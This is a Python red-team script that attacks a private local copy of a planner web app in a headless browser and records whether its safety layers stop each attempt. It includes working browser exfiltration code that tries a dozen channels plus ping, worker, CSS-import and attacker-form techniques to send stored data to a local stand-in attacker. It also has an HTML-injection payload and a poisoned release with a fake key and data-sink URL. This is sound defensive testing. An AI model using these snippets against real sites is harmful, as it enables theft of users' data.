#!/usr/bin/env python3
"""FPLN red team: compromise and break simulations.

Attacks and breaks a PRIVATE copy of FPLN in a real browser and records how each safety layer reacts.
Nothing here touches the live site, cadets, or any outside server: the "attacker" is a collector
running on this machine, and every order goes to a private copy of the signal files.
The app isn't told it's under test; only this script knows.

Each scenario reports:
  verdict  CONTAINED  the attack or break was stopped on the device
           DETECTED   it would be stopped before release (scan) or seen by the owner
           LIMIT      a known exposure the device can't stop by itself (with the protection that covers it)
           BREACH     something got out that should not have
  layers   which safety layers engaged

Usage: python3 .github/safety/redteam.py [--root .] [--out redteam.json] [--chrome PATH] [--only C1,B2]
Exit code 1 on any BREACH.
"""
import argparse, functools, http.server, json, os, re, shutil, socketserver, subprocess, sys, tempfile, threading, time, datetime

ap = argparse.ArgumentParser()
ap.add_argument("--root", default=".")
ap.add_argument("--out", default="")
ap.add_argument("--chrome", default=os.environ.get("FPLN_CHROME", ""))
ap.add_argument("--only", default="")
A = ap.parse_args()
REPO = os.path.abspath(A.root)
CTL = os.path.join(REPO, ".github", "safety", "control.py")
GUARD = os.path.join(REPO, ".github", "safety", "guard.py")
ONLY = set(x.strip().upper() for x in A.only.split(",") if x.strip())
TMP = tempfile.mkdtemp(prefix="fpln-red-")
SITE = os.path.join(TMP, "FPLN-")
FILES = ["index.html", "sw.js", "version.json", "control.json", "manifest.webmanifest", "favicon.ico"]

def fresh_site():
    if os.path.isdir(SITE): shutil.rmtree(SITE)
    os.makedirs(SITE)
    for f in FILES: shutil.copy(os.path.join(REPO, f), SITE)
    shutil.copytree(os.path.join(REPO, "icons"), os.path.join(SITE, "icons"))
    if os.path.isdir(os.path.join(REPO, "vendor")): shutil.copytree(os.path.join(REPO, "vendor"), os.path.join(SITE, "vendor"))
    for a in (["restore"], ["switches", "--off", "none"], ["clear-banner"]):
        subprocess.run([sys.executable, CTL, *a, "--root", SITE], capture_output=True)
fresh_site()

class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass
    def end_headers(self):
        self.send_header("Cache-Control", "no-store"); super().end_headers()
site = socketserver.ThreadingTCPServer(("127.0.0.1", 0), functools.partial(Quiet, directory=TMP)); site.daemon_threads = True
threading.Thread(target=site.serve_forever, daemon=True).start()
URL = "http://localhost:%d/FPLN-/" % site.server_address[1]

# the simulated attacker: records every request that reaches it
HITS = []
class Collector(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _hit(self):
        HITS.append(self.path.split("?")[0].strip("/"))
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.send_header("Access-Control-Allow-Origin", "*"); self.end_headers()
        try: self.wfile.write(b"ok")
        except Exception: pass
    do_GET = do_POST = do_PUT = do_OPTIONS = _hit
coll = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Collector); coll.daemon_threads = True
threading.Thread(target=coll.serve_forever, daemon=True).start()
ATK = "http://127.0.0.1:%d" % coll.server_address[1]

def sig(*a): return subprocess.run([sys.executable, CTL, *a, "--root", SITE, "--by", "redteam"], capture_output=True, text=True).stdout.strip()
def write(name, text): open(os.path.join(SITE, name), "w", encoding="utf-8").write(text)
def read(name): return open(os.path.join(REPO, name), encoding="utf-8").read()
def strip_guard(html):
    i = html.find('<script id="fpln-safety">'); j = html.find("</script>", i) + len("</script>")
    return html[:i] + html[j:]

EXFIL = r"""async (T) => {
  const out = {}; const d = encodeURIComponent(String(localStorage.getItem('fpln:clock') || 'secret').slice(0, 40));
  const tr = async (n, f) => { try { const r = await f(); out[n] = r === false ? 'refused' : 'attempted'; } catch (e) { out[n] = 'refused: ' + String(e && e.message || e).slice(0, 80); } };
  const wait = (ms) => new Promise(r => setTimeout(r, ms));
  await tr('fetch', () => fetch(T + '/fetch?d=' + d, {mode: 'no-cors'}));
  await tr('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', T + '/xhr?d=' + d); x.onload = () => res(); x.onerror = () => rej(new Error('network error')); x.send(); }));
  await tr('beacon', () => navigator.sendBeacon(T + '/beacon', d));
  await tr('image', () => new Promise(res => { const i = new Image(); i.onload = i.onerror = () => res(); i.src = T + '/image?d=' + d; setTimeout(res, 1200); }));
  await tr('script', () => new Promise(res => { const s = document.createElement('script'); s.onload = s.onerror = () => res(); s.src = T + '/script?d=' + d; document.head.appendChild(s); setTimeout(res, 1200); }));
  await tr('stylesheet', () => new Promise(res => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = T + '/stylesheet?d=' + d; document.head.appendChild(l); setTimeout(res, 1200); }));
  await tr('websocket', () => new Promise(res => { const w = new WebSocket(T.replace('http', 'ws') + '/websocket?d=' + d); w.onerror = w.onopen = () => res(); setTimeout(res, 1200); }));
  await tr('frame', () => new Promise(res => { const f = document.createElement('iframe'); f.src = T + '/frame?d=' + d; document.body.appendChild(f); setTimeout(res, 1200); }));
  await tr('fresh-frame-fetch', () => { const f = document.createElement('iframe'); document.body.appendChild(f); return f.contentWindow.fetch(T + '/fresh-frame-fetch?d=' + d, {mode: 'no-cors'}); });
  await tr('form', () => new Promise(res => { const f = document.createElement('form'); f.method = 'POST'; f.action = T + '/form'; f.target = 'sink' + Date.now(); const i = document.createElement('input'); i.name = 'd'; i.value = d; f.appendChild(i); document.body.appendChild(f); try { f.submit(); } catch (e) {} setTimeout(res, 1200); }));
  await tr('popup', () => { const w = window.open(T + '/popup?d=' + d); if (!w) return false; });
  await tr('scripted-link', () => { const a = document.createElement('a'); a.href = T + '/scripted-link?d=' + d; a.target = '_blank'; document.body.appendChild(a); a.click(); });
  await wait(1500);
  return out;
}"""
CHANNELS = ["fetch", "xhr", "beacon", "image", "script", "stylesheet", "websocket", "frame", "fresh-frame-fetch", "form", "popup", "scripted-link"]

RESULTS = []
def scenario(sid, kind, title, attack, expect):
    def deco(fn):
        def run(b):
            if ONLY and sid not in ONLY: return
            fresh_site(); HITS.clear()
            r = {"id": sid, "kind": kind, "title": title, "attack": attack, "expect": expect, "verdict": "", "layers": [], "observed": [], "channels": {}}
            t0 = time.time()
            try: fn(b, r)
            except Exception as e:
                r["verdict"] = r["verdict"] or "ERROR"; r["observed"].append("Test error: " + str(e)[:160])
            r["seconds"] = round(time.time() - t0, 1)
            RESULTS.append(r)
            print("%-9s %s  %s  [%s]" % (r["verdict"], sid, title, ", ".join(r["layers"])))
            for o in r["observed"]: print("            " + o)
        run.sid = sid
        SCEN.append(run); return run
    return deco
SCEN = []

def new_ctx(b, csp_log=True):
    ctx = b.new_context()
    ctx.route("https://braveheart30.github.io/FPLN-/*", lambda rt: rt.fulfill(path=os.path.join(SITE, rt.request.url.split("/FPLN-/")[1].split("?")[0].split("#")[0])) if os.path.exists(os.path.join(SITE, rt.request.url.split("/FPLN-/")[1].split("?")[0].split("#")[0])) else rt.fulfill(status=404, body="missing"))
    if csp_log: ctx.add_init_script("window.__csp=[];document.addEventListener('securitypolicyviolation',e=>window.__csp.push(e.blockedURI||''));")
    return ctx
def install(ctx, data=True):
    pg = ctx.new_page(); pg.goto(URL); time.sleep(4); pg.reload(); time.sleep(3)
    if data: pg.evaluate("localStorage.setItem('fpln:clock', JSON.stringify({v:3,tasks:[{id:'r1',t:'PLANNER SECRET'}]}))")
    return pg
def done(ctx, pg, r):
    """Keep the app's own flight-recorder view of the scenario (what it saw and did), then close."""
    try:
        ev = pg.evaluate("window.FPLN_MONITOR ? window.FPLN_MONITOR.events().filter(function(e){ return !e.old; }).slice(-60) : []")
        g = pg.evaluate("window.FPLN_MONITOR ? window.FPLN_MONITOR.gauges() : null")
        if ev: r["recorder"] = ev
        if g: r["gauges"] = {k: g[k] for k in ("allowed", "blocked", "writes", "errors", "csp", "checks") if k in g}
    except Exception: pass
    try: ctx.close()
    except Exception: pass
def nudge(pg, reload=True):
    if reload:
        try:
            with pg.expect_navigation(timeout=12000): pg.evaluate("dispatchEvent(new Event('online'))")
        except Exception: pass
    else: pg.evaluate("dispatchEvent(new Event('online'))")
    pg.wait_for_load_state("domcontentloaded"); time.sleep(3)
def locked(pg):
    try: return pg.evaluate("!!document.getElementById('fplnLocked')")
    except Exception: return False
def attribute(r, out, csp):
    """Turn the attempt results and the collector's log into per-channel outcomes and engaged layers."""
    hits = set(HITS)
    layers = set()
    for ch in CHANNELS:
        res = out.get(ch, "not run")
        if ch in hits: r["channels"][ch] = "GOT OUT"
        elif "FPLN" in res: r["channels"][ch] = "Stopped: app guard (L4)"; layers.add("L4 app guard")
        elif any(("/" + ch) in (u or "") for u in csp): r["channels"][ch] = "Stopped: browser policy (L8)"; layers.add("L8 allowlist policy")
        elif res == "refused" and ch == "popup": r["channels"][ch] = "Stopped: app guard (L4)"; layers.add("L4 app guard")
        else: r["channels"][ch] = "Stopped: service worker or browser (L6)"; layers.add("L6 service worker")
    got = [c for c in CHANNELS if r["channels"].get(c) == "GOT OUT"]
    return got, sorted(layers)

# ---------------- COMPROMISE ----------------
@scenario("C1", "Compromise", "Injected code tries to steal planner data", "Malicious code running inside FPLN (as if a library or pasted content were compromised) tries 12 ways to send the planner to an unknown server, while FPLN is running normally.", "Nothing reaches the attacker.")
def c1(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]")
    got, layers = attribute(r, out, csp)
    r["layers"] = layers
    r["observed"].append("%d of %d channels got out" % (len(got), len(CHANNELS)) + (": " + ", ".join(got) if got else ""))
    r["verdict"] = "BREACH" if got else "CONTAINED"; done(ctx, pg, r)

@scenario("C2", "Compromise", "Same theft attempt after you press Pause", "The owner pauses FPLN; the malicious code tries all 12 channels again.", "Nothing reaches the attacker; the pause screen stays up.")
def c2(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]")
    got, layers = attribute(r, out, csp)
    r["layers"] = ["L1 main signal", "L3 device latch", "L5 browser lock"] + layers
    r["observed"].append("Paused: %s · %d of %d channels got out" % ("yes" if locked(pg) else "NO", len(got), len(CHANNELS)))
    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; done(ctx, pg, r)

@scenario("C3", "Compromise", "Poisoned update strips the app's guard", "A bad release reaches the site with the guard script removed and theft code added. Devices that already have FPLN load it.", "The release scan blocks it before it ships. If it shipped anyway, the service worker still stops the theft.")
def c3(b, r):
    # 1) would the release scan stop it?
    pdir = tempfile.mkdtemp(prefix="fpln-poison-"); shutil.copytree(SITE, os.path.join(pdir, "site"))
    bad = strip_guard(read("index.html")).replace("</body>", "<script>fetch('https://collect.' + 'x' + '/p');var u='https://collect" + ".data-sink.com/upload';var k='sk-ant-" + "A" * 32 + "';</script>\n<!-- CUI" + "// SP-PRVCY --></body>")
    open(os.path.join(pdir, "site", "index.html"), "w").write(bad)
    g = subprocess.run([sys.executable, GUARD, "--root", os.path.join(pdir, "site")], capture_output=True, text=True)
    found = [l.strip() for l in g.stdout.splitlines() if l.strip().startswith(("SECRET", "CUI", "NEW ADDRESS", "PERSONAL", "FILE")) or "SECRET:" in l or "CUI:" in l or "NEW ADDRESS" in l]
    blocked = g.returncode != 0
    r["observed"].append("Release scan: %s (%d finding%s)" % ("BLOCKED the release" if blocked else "missed it", len(found), "" if len(found) == 1 else "s"))
    shutil.rmtree(pdir, ignore_errors=True)
    # 2) if it shipped anyway
    ctx = new_ctx(b); pg = install(ctx)
    write("index.html", strip_guard(read("index.html")))
    pg.reload(); time.sleep(4)
    guardless = pg.evaluate("!window.FPLN_GUARD")
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]")
    got, layers = attribute(r, out, csp)
    r["observed"].append("Guard gone on device: %s · %d of %d channels got out" % ("yes" if guardless else "no", len(got), len(CHANNELS)) + (": " + ", ".join(got) if got else ""))
    r["layers"] = (["G1 release scan"] if blocked else []) + layers
    r["verdict"] = "BREACH" if got else ("CONTAINED" if blocked else "CONTAINED")
    if got and blocked: r["verdict"] = "DETECTED"
    done(ctx, pg, r)

@scenario("C4", "Compromise", "Attacker controls the whole site", "Someone with your GitHub account replaces both the app and its service worker with their own code.", "Device layers can't stop the owner's own account. Account security and the GitHub checks are the protection.")
def c4(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    write("index.html", strip_guard(read("index.html")))
    write("sw.js", "self.addEventListener('install',()=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));")
    pg.evaluate("navigator.serviceWorker.getRegistration().then(r=>r&&r.update())"); time.sleep(3); pg.reload(); time.sleep(4)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]")
    got, layers = attribute(r, out, csp)
    r["observed"].append("%d of %d channels got out once the attacker replaced every file" % (len(got), len(CHANNELS)))
    r["observed"].append("Covered by: two-factor sign-in on GitHub, the release scan and GitHub safety check on every push, and the Actions run list on your checklist.")
    r["layers"] = ["G2 GitHub safety check", "G4 owner-only controls"]
    r["verdict"] = "LIMIT"; done(ctx, pg, r)

@scenario("C5", "Compromise", "Forged or broken signal tries to unpause", "While FPLN is paused, an attacker rewrites control.json to say none (version.json still says pause), then corrupts it, then sends an unknown state.", "FPLN stays paused through all three.")
def c5(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    states = []
    c = json.load(open(os.path.join(SITE, "control.json"))); c["kill"] = {"state": "none", "id": "forged"}; write("control.json", json.dumps(c))
    nudge(pg, False); time.sleep(2); states.append(("forged none", locked(pg)))
    write("control.json", "{ this is not json"); nudge(pg, False); time.sleep(2); states.append(("corrupt file", locked(pg)))
    c["kill"] = {"state": "unlock-everything", "id": "x"}; write("control.json", json.dumps(c)); nudge(pg, False); time.sleep(2); states.append(("unknown state", locked(pg)))
    for n, s in states: r["observed"].append("%s: %s" % (n, "still paused" if s else "UNPAUSED"))
    r["layers"] = ["L2 backup signal", "L3 device latch"]
    r["verdict"] = "CONTAINED" if all(s for _, s in states) else "BREACH"; done(ctx, pg, r)

@scenario("C6", "Compromise", "Script hidden in a message", "Banner and pause messages carry HTML and script meant to run inside FPLN.", "Shown as plain text; nothing runs.")
def c6(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    pay = '<img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script>'
    sig("banner", "--msg", pay); nudge(pg, False); time.sleep(3)
    t1 = pg.evaluate("(document.getElementById('fplnBanner')||{}).textContent||''"); p1 = pg.evaluate("window.__pwned||0")
    sig("clear-banner"); sig("freeze", "--msg", pay); nudge(pg); time.sleep(1)
    t2 = pg.evaluate("(document.getElementById('fplnLocked')||{}).textContent||''"); p2 = pg.evaluate("window.__pwned||0")
    r["observed"].append("Banner: %s" % ("shown as text, nothing ran" if "onerror" in t1 and not p1 else "CODE RAN" if p1 else "not shown"))
    r["observed"].append("Pause message: %s" % ("shown as text, nothing ran" if "onerror" in t2 and not p2 else "CODE RAN" if p2 else "not shown"))
    r["layers"] = ["L4 app guard (text only)"]
    r["verdict"] = "BREACH" if (p1 or p2) else "CONTAINED"; done(ctx, pg, r)

@scenario("C7", "Compromise", "Code inside FPLN tries to free itself", "While paused, malicious code deletes the pause latch and the worker's copy of the pause, then restarts FPLN.", "FPLN re-locks on its next check; outside traffic stays blocked.")
def c7(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    pg.evaluate("localStorage.removeItem('fpln:lock'); caches.delete('fpln-ctl')"); pg.reload(); time.sleep(5)
    rel = locked(pg)
    if not rel: nudge(pg); rel = locked(pg)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
    r["observed"].append("Re-locked: %s · %d channels got out" % ("yes" if rel else "NO", len(got)))
    r["layers"] = ["L1 main signal", "L2 backup signal"] + layers
    r["verdict"] = "BREACH" if got or not rel else "CONTAINED"; done(ctx, pg, r)

@scenario("C8", "Compromise", "Code keeps rewriting data during Erase", "While the owner erases FPLN, malicious code writes the planner back every 50 ms.", "After Erase, no FPLN data remains.")
def c8(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    pg.evaluate("setInterval(()=>{ try{ localStorage.setItem('fpln:clock','{\"tasks\":[{\"t\":\"PLANNER SECRET\"}]}'); localStorage.setItem('fpln:dash','x'); }catch(e){} }, 50)")
    sig("erase", "--msg", "Shut down"); nudge(pg); time.sleep(2)
    keys = pg.evaluate("Object.keys(localStorage)")
    left = [k for k in keys if k.startswith("fpln") and k not in ("fpln:lock", "fpln:ring")]
    r["observed"].append("FPLN data left after erase: %s" % (", ".join(left) if left else "none"))
    r["layers"] = ["L3 device latch", "Erase re-wipe on start"]
    r["verdict"] = "BREACH" if left else "CONTAINED"; done(ctx, pg, r)

@scenario("C9", "Compromise", "Fake test group tries to cancel a pause", "A device is enrolled in a group whose orders say none while everyone is paused.", "The most severe order wins; the device stays paused.")
def c9(b, r):
    import hashlib
    ctx = new_ctx(b); pg = install(ctx)
    tok = "redteamgroup0000000001"; h = hashlib.sha256(tok.encode()).hexdigest()[:24]
    pg.goto(URL + "#ring=" + tok); time.sleep(3)
    sig("freeze", "--msg", "Paused"); sig("switches", "--ring", h, "--off", "none")
    c = json.load(open(os.path.join(SITE, "control.json"))); c.setdefault("rings", {})[h] = {"kill": {"state": "none", "id": "fake"}, "off": [], "banner": None}; write("control.json", json.dumps(c))
    nudge(pg); time.sleep(1)
    r["observed"].append("Device in group: %s · paused: %s" % ("yes" if pg.evaluate("localStorage.getItem('fpln:ring')") == h else "no", "yes" if locked(pg) else "NO"))
    r["layers"] = ["L1 main signal", "L2 backup signal"]
    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)

@scenario("C10", "Compromise", "Orders arrive out of order", "Pause and Restore are pressed seconds apart; the Restore run finishes first, then the slower Pause run tries to apply. Then an attacker replays an old Pause.", "The newest order wins; an older or replayed order is refused.")
def c10(b, r):
    t = int(time.time() * 1000)
    sig("restore", "--at", str(t + 8000))
    o1 = subprocess.run([sys.executable, CTL, "freeze", "--at", str(t), "--root", SITE], capture_output=True, text=True)
    st = json.load(open(os.path.join(SITE, "control.json")))["kill"]["state"]
    r["observed"].append("Slow pause run: %s · live state: %s" % ("refused" if o1.returncode == 3 else "APPLIED", st))
    o2 = subprocess.run([sys.executable, CTL, "freeze", "--at", str(t - 86400000), "--root", SITE], capture_output=True, text=True)
    r["observed"].append("Replayed day-old pause: %s" % ("refused" if o2.returncode == 3 else "APPLIED"))
    r["layers"] = ["G5 order clock"]
    r["verdict"] = "CONTAINED" if o1.returncode == 3 and o2.returncode == 3 and st == "none" else "BREACH"

# ---------------- BREAK ----------------
@scenario("B1", "Break", "Site goes down while paused", "Both signal files start failing (server errors) after the pause.", "Device stays paused.")
def b1(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    os.remove(os.path.join(SITE, "control.json")); os.remove(os.path.join(SITE, "version.json"))
    nudge(pg, False); pg.reload(); time.sleep(4)
    r["observed"].append("Paused after site failure and restart: %s" % ("yes" if locked(pg) else "NO"))
    r["layers"] = ["L3 device latch", "L6 service worker"]
    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)

@scenario("B2", "Break", "Site goes down during normal use", "The site is unreachable while cadets use FPLN normally.", "FPLN keeps working for cadets. New orders can't arrive until the site is back.")
def b2(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    os.remove(os.path.join(SITE, "control.json")); os.remove(os.path.join(SITE, "version.json"))
    nudge(pg, False); pg.reload(); time.sleep(4)
    works = (not locked(pg)) and pg.evaluate("(document.getElementById('fClock').srcdoc||'').length>1000")
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
    r["observed"].append("App still works: %s · theft still blocked: %s" % ("yes" if works else "NO", "yes" if not got else "NO"))
    r["observed"].append("Covered by: kill paths B–E don't depend on the site being up; a device that can't reach the site can't reach anyone else's server either through FPLN.")
    r["layers"] = layers
    r["verdict"] = "BREACH" if got else "LIMIT"; done(ctx, pg, r)

@scenario("B3", "Break", "Service worker missing while paused", "The background worker is removed (cleared by the browser or a bug) on a paused device.", "The app's own layers keep it paused and blocked.")
def b3(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    pg.evaluate("navigator.serviceWorker.getRegistrations().then(rs=>Promise.all(rs.map(x=>x.unregister())))"); time.sleep(1); pg.reload(); time.sleep(4)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
    r["observed"].append("Paused: %s · %d channels got out" % ("yes" if locked(pg) else "NO", len(got)))
    r["layers"] = ["L3 device latch", "L5 browser lock"] + [l for l in layers if not l.startswith("L6")]
    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; done(ctx, pg, r)

@scenario("B4", "Break", "Broken release while paused", "A release ships with the guard script missing while FPLN is paused.", "No pause screen, but the service worker still blocks everything outside.")
def b4(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    write("index.html", strip_guard(read("index.html"))); pg.reload(); time.sleep(4)
    out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
    screen = "app pause screen" if locked(pg) else ("worker's own pause screen" if "paused" in (pg.inner_text("body") or "").lower() else "none")
    r["observed"].append("Shown: %s · %d channels got out" % (screen, len(got)))
    r["layers"] = ["L6 service worker (pause screen + browser policy)"]
    r["verdict"] = "BREACH" if got else "CONTAINED"; done(ctx, pg, r)

@scenario("B5", "Break", "Cadet clears browser data while paused", "The cadet clears site data on a paused device, then opens FPLN online.", "FPLN re-locks on its first check.")
def b5(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    sig("freeze", "--msg", "Paused"); nudge(pg)
    pg.evaluate("localStorage.clear()"); t0 = time.time(); pg.reload(); time.sleep(2)
    if not locked(pg): nudge(pg)
    r["observed"].append("Re-locked: %s (about %d s)" % ("yes" if locked(pg) else "NO", time.time() - t0))
    r["layers"] = ["L1 main signal", "L6 service worker"]
    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)

@scenario("B6", "Break", "One signal copy missing", "Pause is sent, then control.json disappears; separately version.json disappears.", "Either copy alone keeps the pause.")
def b6(b, r):
    ok = []
    for missing in ("control.json", "version.json"):
        fresh_site(); ctx = new_ctx(b); pg = install(ctx)
        sig("freeze", "--msg", "Paused"); os.remove(os.path.join(SITE, missing)); nudge(pg)
        ok.append(locked(pg)); r["observed"].append("%s missing: %s" % (missing, "paused" if locked(pg) else "NOT PAUSED")); done(ctx, pg, r)
    r["layers"] = ["L1 main signal", "L2 backup signal"]
    r["verdict"] = "CONTAINED" if all(ok) else "BREACH"

@scenario("B7", "Break", "Device offline when the pause is sent", "The device is offline when the owner pauses, then reconnects.", "Nothing can leave while offline; the pause applies on reconnect.")
def b7(b, r):
    ctx = new_ctx(b); pg = install(ctx)
    ctx.set_offline(True); sig("freeze", "--msg", "Paused"); time.sleep(2)
    before = locked(pg); ctx.set_offline(False); t0 = time.time(); nudge(pg)
    r["observed"].append("Paused while offline: %s · paused after reconnect: %s (about %d s)" % ("yes" if before else "no (expected)", "yes" if locked(pg) else "NO", time.time() - t0))
    r["layers"] = ["L1 main signal"]
    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)

# ---------------- VACCINE: current threats from threats.json ----------------
TECH = r"""async ([tech, T]) => {
  const d = encodeURIComponent('PLANNER-SECRET'); const wait = (ms) => new Promise(r => setTimeout(r, ms)); let res = 'attempted';
  try {
    if (tech === 'attacker-form') { await fetch('https://docs.google.com/forms/d/e/1FAIpQLattackerOwnForm000000000000000/formResponse?entry.1=' + d, {method: 'POST', mode: 'no-cors'}); }
    if (tech === 'a-ping') { const a = document.createElement('a'); a.href = '#'; a.setAttribute('ping', T + '/a-ping?d=' + d); document.body.appendChild(a); a.click(); a.remove(); await wait(1200); }
    if (tech === 'worker-fetch') { const b = new Blob(["fetch('" + T + "/worker-fetch?d=" + d + "',{mode:'no-cors'}).then(()=>postMessage('sent'),e=>postMessage('refused: '+e.message))"], {type: 'text/javascript'});
      const w = new Worker(URL.createObjectURL(b)); res = await new Promise(r => { w.onmessage = e => r(e.data); w.onerror = e => r('refused: worker blocked'); setTimeout(() => r('timeout'), 2500); }); }
    if (tech === 'innerhtml-img') { const x = document.createElement('div'); x.innerHTML = '<img src="' + T + '/innerhtml-img?d=' + d + '">'; document.body.appendChild(x); await wait(1200); }
    if (tech === 'svg-image') { const x = document.createElement('div'); x.innerHTML = '<svg><image href="' + T + '/svg-image?d=' + d + '"/></svg>'; document.body.appendChild(x); await wait(1200); }
    if (tech === 'css-import') { const st = document.createElement('style'); st.textContent = '@import url("' + T + '/css-import?d=' + d + '");'; document.head.appendChild(st); await wait(1200); }
    if (tech === 'frame-refresh') { const f = document.createElement('iframe'); f.srcdoc = '<meta http-equiv="refresh" content="0;url=' + T + '/frame-refresh?d=' + d + '">'; document.body.appendChild(f); await wait(2000); }
  } catch (e) { res = 'refused: ' + String(e && e.message || e).slice(0, 80); }
  return res;
}"""
def vaccine_list():
    try: return [t for t in json.load(open(os.path.join(REPO, ".github", "safety", "threats.json")))["threats"] if t["type"] in ("exfil", "api-absent")]
    except Exception: return []
VAX = vaccine_list()
@scenario("V1", "Vaccine", "Current threats from the weekly threat list", "Each technique on the vaccine list is tried by hostile code inside FPLN while it runs normally.", "Every technique is refused; nothing reaches the attacker.")
def v1(b, r):
    ctx = new_ctx(b); pg = install(ctx); bad = []
    for t in VAX:
        HITS.clear()
        if t["type"] == "api-absent":
            out = pg.evaluate("""(api) => { try { const f = document.createElement('iframe'); document.body.appendChild(f);
              for (const w of [window, f.contentWindow]) { if (typeof w[api] === 'function') { try { new w[api]({iceServers: []}); return 'AVAILABLE'; } catch (e) { if (!/FPLN/.test(String(e && e.message))) return 'AVAILABLE'; } } }
              return 'refused'; } catch (e) { return 'refused'; } }""", t["api"])
            ok = out != "AVAILABLE"; how = "Removed by app guard (L4)" if ok else "AVAILABLE"
        else:
            csp0 = len(pg.evaluate("window.__csp||[]"))
            out = pg.evaluate(TECH, [t["technique"], ATK]); time.sleep(0.5)
            csp = pg.evaluate("window.__csp||[]")[csp0:]
            hit = any(h.startswith(t["technique"]) for h in HITS)
            external = t["technique"] == "attacker-form"
            if hit: ok, how = False, "GOT OUT"
            elif "FPLN" in str(out): ok, how = True, "Stopped: app guard (L4)"
            elif csp: ok, how = True, "Stopped: browser policy (L8)"
            elif external: ok, how = False, "NOT REFUSED (would reach Google)"
            else: ok, how = True, "Stopped: service worker or browser (L6)"
        r["channels"][t["id"]] = how
        if not ok: bad.append(t["id"])
    r["observed"].append("%d of %d current threats refused" % (len(VAX) - len(bad), len(VAX)) + (": failed " + ", ".join(bad) if bad else ""))
    r["layers"] = sorted(set(("L4 app guard" if "L4" in v else "L8 allowlist policy" if "L8" in v else "L6 service worker") for v in r["channels"].values() if "Stopped" in v or "Removed" in v))
    r["verdict"] = "BREACH" if bad else "CONTAINED"; done(ctx, pg, r)

started = time.time()
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    kw = {"args": ["--no-sandbox"]}
    if A.chrome: kw["executable_path"] = A.chrome
    b = p.chromium.launch(**kw)
    for s in SCEN: s(b)
    b.close()
site.shutdown(); coll.shutdown(); shutil.rmtree(TMP, ignore_errors=True)

count = {}
for r in RESULTS: count[r["verdict"]] = count.get(r["verdict"], 0) + 1
out = {"at": datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds"), "seconds": round(time.time() - started),
       "summary": count, "result": "Fail" if count.get("BREACH") or count.get("ERROR") else "Pass", "scenarios": RESULTS}
print("\nFPLN red team: %s in %ds" % (", ".join("%d %s" % (v, k) for k, v in sorted(count.items())), out["seconds"]))
if A.out:
    with open(A.out, "w") as f: json.dump(out, f, indent=1)
sys.exit(1 if count.get("BREACH") or count.get("ERROR") else 0)
